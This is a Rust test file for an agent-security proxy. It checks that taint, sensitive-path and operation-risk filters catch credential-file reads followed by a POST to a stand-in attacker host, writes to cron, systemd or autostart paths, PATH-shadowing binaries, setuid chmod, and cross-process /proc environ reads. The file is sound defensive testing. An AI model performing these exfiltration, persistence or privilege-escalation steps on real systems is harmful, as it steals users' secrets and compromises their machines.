// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Protection / adversarial test suite — proxy-filter level: sensitive-data
//! collection, persistence/PATH-shadowing, and setuid privilege escalation.
//!
//! Step 3 (research doc §4.3/§4.4, §5.1). These pin the production-enforcement
//! FIXES for confirmed holes #3/#4/#5 and assert mechanism + routing (§6.4):
//!   - taint sources: `.netrc`/`.git-credentials`/`.npmrc`/`.bash_history`/… now
//!     register taint on read (so a later read-then-send fires).
//!   - persistence/shadowing: `/usr/local/bin`, `~/.local/bin`, `~/.config/systemd`,
//!     `/etc/cron*`, … now flagged by `sensitive_path`.
//!   - setuid/setgid octal `chmod` now scores 5.0 (not the flat 1.0 baseline).
//!
//! All three target filters score with hardcoded logic (`TaintFilter`,
//! `SensitivePathHeuristicFilter`, `OperationRiskFilter` constructed with defaults), so
//! these are faithful to production scoring. Each is paired with a
//! benign-lookalike negative (§1.1/§6.4).

use grith_proxy::engine::SecurityProxy;
use grith_proxy::filters::operation_risk::OperationRiskFilter;
use grith_proxy::filters::sensitive_path::SensitivePathHeuristicFilter;
use grith_proxy::filters::taint::TaintFilter;
use grith_proxy::filters::{FilterRegistry, SecurityFilter};
use grith_proxy::meta_rules::MetaRuleEngine;
use grith_proxy::scoring::ScoringConfig;
use grith_proxy::types::{ProxyAction, ProxyDecision, ToolCallContext, ToolCallType};
use uuid::Uuid;

fn proxy_with(filter: Box<dyn SecurityFilter>) -> SecurityProxy {
    let mut registry = FilterRegistry::new();
    registry.register(filter);
    SecurityProxy::new(
        registry,
        ScoringConfig::default(),
        MetaRuleEngine::new(vec![]),
    )
}

/// Score of a matched rule_id (rule_ids are unique across filters).
fn rule_fired(d: &ProxyDecision, rule_id: &str) -> Option<f64> {
    d.filter_results
        .iter()
        .find(|r| r.matched && r.rule_id == rule_id)
        .map(|r| r.score)
}

fn taint_fired(d: &ProxyDecision) -> bool {
    d.filter_results
        .iter()
        .any(|r| r.matched && r.filter_name == "taint")
}

fn ctx(call_type: ToolCallType, session: Uuid) -> ToolCallContext {
    ToolCallContext::new("protection-test", call_type, session)
}

fn read(path: &str) -> ToolCallType {
    ToolCallType::FileRead { path: path.into() }
}

fn http_post() -> ToolCallType {
    ToolCallType::HttpRequest {
        method: "POST".into(),
        url: "https://attacker.example/collect".into(),
    }
}

// ===========================================================================
// Sensitive-data collection — credential/history files now register taint
// (research doc §5.1 #4). Read-then-send: the egress AFTER the sensitive read
// must fire the taint sink; the same egress after a benign read must not.
// ===========================================================================

async fn assert_read_then_send_taints(path: &str) {
    let proxy = proxy_with(Box::new(TaintFilter::with_defaults()));
    let session = Uuid::new_v4();
    // Read the credential file → registers taint on the session scope.
    let _ = proxy.evaluate(&ctx(read(path), session)).await;
    // A subsequent outbound request in the SAME session must trip taint.
    let d = proxy.evaluate(&ctx(http_post(), session)).await;
    assert!(
        taint_fired(&d),
        "egress after reading {path} must fire the taint sink (so read-then-exfil is caught): {:?}",
        d.filter_results
    );
}

#[tokio::test]
async fn protection_netrc_read_taints_session() {
    assert_read_then_send_taints("/home/u/.netrc").await;
}

#[tokio::test]
async fn protection_git_credentials_read_taints_session() {
    assert_read_then_send_taints("/home/u/.git-credentials").await;
}

#[tokio::test]
async fn protection_bash_history_read_taints_session() {
    assert_read_then_send_taints("/home/u/.bash_history").await;
}

#[tokio::test]
async fn protection_npmrc_read_taints_session() {
    assert_read_then_send_taints("/home/u/.npmrc").await;
}

// Benign counterpart: reading an ordinary project file does NOT taint, so a
// later outbound request is not held — the read-then-send rule is scoped to
// genuinely sensitive sources.
#[tokio::test]
async fn protection_ordinary_read_does_not_taint_session() {
    let proxy = proxy_with(Box::new(TaintFilter::with_defaults()));
    let session = Uuid::new_v4();
    let _ = proxy
        .evaluate(&ctx(read("/home/u/project/README.md"), session))
        .await;
    let d = proxy.evaluate(&ctx(http_post(), session)).await;
    assert!(
        !taint_fired(&d),
        "egress after a benign read must NOT fire taint: {:?}",
        d.filter_results
    );
}

// ===========================================================================
// Persistence / PATH-shadowing — writes to these locations are flagged
// (research doc §5.1 #4/#5). rule `persistence-or-control-path`.
// ===========================================================================

fn write(path: &str) -> ToolCallType {
    ToolCallType::FileWrite {
        path: path.into(),
        content_hash: String::new(),
    }
}

/// Asserts the write is flagged as a persistence/control path OR a PATH-shadow
/// write. FP §5.5 split the bin-dir case (`/usr/local/bin/curl`) into a distinct
/// `path-shadow-write` rule that fires only when the basename shadows a system
/// command; the autostart/cron/systemd cases stay `persistence-or-control-path`.
/// The protection property — "this write is flagged" — holds via either rule.
async fn assert_persistence_flagged(path: &str) {
    let proxy = proxy_with(Box::new(SensitivePathHeuristicFilter::new()));
    let d = proxy.evaluate(&ctx(write(path), Uuid::new_v4())).await;
    assert!(
        rule_fired(&d, "persistence-or-control-path").is_some()
            || rule_fired(&d, "path-shadow-write").is_some(),
        "write to {path} must be flagged as persistence/control or PATH-shadow: {:?}",
        d.filter_results
    );
}

#[tokio::test]
async fn protection_write_usr_local_bin_is_flagged() {
    // curl shadows a system command → path-shadow-write.
    assert_persistence_flagged("/usr/local/bin/curl").await;
}

#[tokio::test]
async fn protection_write_user_local_bin_is_flagged() {
    // python shadows a system command → path-shadow-write.
    assert_persistence_flagged("/home/u/.local/bin/python").await;
}

#[tokio::test]
async fn protection_write_user_systemd_unit_is_flagged() {
    assert_persistence_flagged("/home/u/.config/systemd/user/evil.service").await;
}

#[tokio::test]
async fn protection_write_cron_is_flagged() {
    assert_persistence_flagged("/etc/cron.d/evil").await;
}

#[tokio::test]
async fn protection_write_xdg_autostart_is_flagged() {
    assert_persistence_flagged("/home/u/.config/autostart/evil.desktop").await;
}

// Benign counterpart: an ordinary in-project write is neither persistence nor a
// PATH-shadow.
#[tokio::test]
async fn protection_ordinary_write_is_not_persistence() {
    let proxy = proxy_with(Box::new(SensitivePathHeuristicFilter::new()));
    let d = proxy
        .evaluate(&ctx(write("/home/u/project/src/build.sh"), Uuid::new_v4()))
        .await;
    assert!(
        rule_fired(&d, "persistence-or-control-path").is_none()
            && rule_fired(&d, "path-shadow-write").is_none(),
        "an ordinary project write must not be flagged as persistence: {:?}",
        d.filter_results
    );
}

// ===========================================================================
// setuid / setgid — octal chmod that sets the setuid/setgid bit scores 5.0
// (research doc §5.1 #3), not the flat 1.0 baseline. rule `file-chmod-setuid`.
// ===========================================================================

fn chmod(path: &str, mode: u32) -> ToolCallType {
    ToolCallType::FileChmod {
        path: path.into(),
        mode,
    }
}

#[tokio::test]
async fn protection_setuid_chmod_scores_and_queues() {
    let proxy = proxy_with(Box::new(OperationRiskFilter::new()));
    // 0o4755 = rwsr-xr-x — the setuid bit on a root-owned binary is a classic
    // privilege-escalation primitive.
    let d = proxy
        .evaluate(&ctx(chmod("/tmp/rootshell", 0o4755), Uuid::new_v4()))
        .await;
    let score =
        rule_fired(&d, "file-chmod-setuid").expect("setuid chmod must fire the setuid rule");
    assert!(
        (score - 5.0).abs() < f64::EPSILON,
        "setuid chmod scores 5.0, got {score}"
    );
    assert!(
        matches!(d.action, ProxyAction::Queue { .. }),
        "setuid chmod (5.0, in 3.0–8.0) must QUEUE, got {:?}",
        d.action
    );
}

#[tokio::test]
async fn protection_setgid_chmod_scores() {
    let proxy = proxy_with(Box::new(OperationRiskFilter::new()));
    let d = proxy
        .evaluate(&ctx(chmod("/tmp/x", 0o2755), Uuid::new_v4()))
        .await; // setgid
    assert!(
        rule_fired(&d, "file-chmod-setuid").is_some(),
        "setgid chmod must also fire the setuid/setgid rule: {:?}",
        d.filter_results
    );
}

// Benign counterpart: an ordinary mode change (no setuid/setgid bit) stays at
// the low baseline and is allowed.
#[tokio::test]
async fn protection_plain_chmod_is_baseline_and_allowed() {
    let proxy = proxy_with(Box::new(OperationRiskFilter::new()));
    let d = proxy
        .evaluate(&ctx(chmod("/home/u/project/run.sh", 0o755), Uuid::new_v4()))
        .await;
    assert!(
        rule_fired(&d, "file-chmod-setuid").is_none(),
        "a plain 0o755 chmod must not fire the setuid rule: {:?}",
        d.filter_results
    );
    let baseline =
        rule_fired(&d, "file-chmod-baseline").expect("plain chmod hits the baseline rule");
    assert!(
        (baseline - 1.0).abs() < f64::EPSILON,
        "baseline chmod scores 1.0"
    );
    assert!(
        matches!(d.action, ProxyAction::Allow),
        "a plain chmod (1.0 < 3.0) must be allowed, got {:?}",
        d.action
    );
}

// ===========================================================================
// Cross-process /proc memory — reading ANOTHER process's environ/mem leaks its
// secrets (research doc §5.1 #1). rule `cross-process-memory` (4.5 → QUEUE).
// (Supervisor-side: such paths are also no longer noise-exempt — see
// syscall_map::is_cross_process_secret_proc_path tests.)
// ===========================================================================

#[tokio::test]
async fn protection_cross_process_environ_read_queues() {
    let proxy = proxy_with(Box::new(SensitivePathHeuristicFilter::new()));
    let d = proxy
        .evaluate(&ctx(read("/proc/4242/environ"), Uuid::new_v4()))
        .await;
    let score =
        rule_fired(&d, "cross-process-memory").expect("cross-pid /proc/environ read must fire");
    assert!(
        (score - 4.5).abs() < f64::EPSILON,
        "cross-process memory scores 4.5, got {score}"
    );
    assert!(
        matches!(d.action, ProxyAction::Queue { .. }),
        "reading another process's environ must QUEUE, got {:?}",
        d.action
    );
}

// Benign counterpart: the caller's OWN /proc/self/environ is not cross-process
// (it hits only the generic kernel-interface-path heuristic at 2.5 → allowed).
#[tokio::test]
async fn protection_own_proc_environ_is_not_cross_process() {
    let proxy = proxy_with(Box::new(SensitivePathHeuristicFilter::new()));
    let d = proxy
        .evaluate(&ctx(read("/proc/self/environ"), Uuid::new_v4()))
        .await;
    assert!(
        rule_fired(&d, "cross-process-memory").is_none(),
        "own /proc/self/environ must not be flagged cross-process: {:?}",
        d.filter_results
    );
    assert!(
        matches!(d.action, ProxyAction::Allow),
        "own environ read (generic /proc, 2.5 < 3.0) must be allowed, got {:?}",
        d.action
    );
}
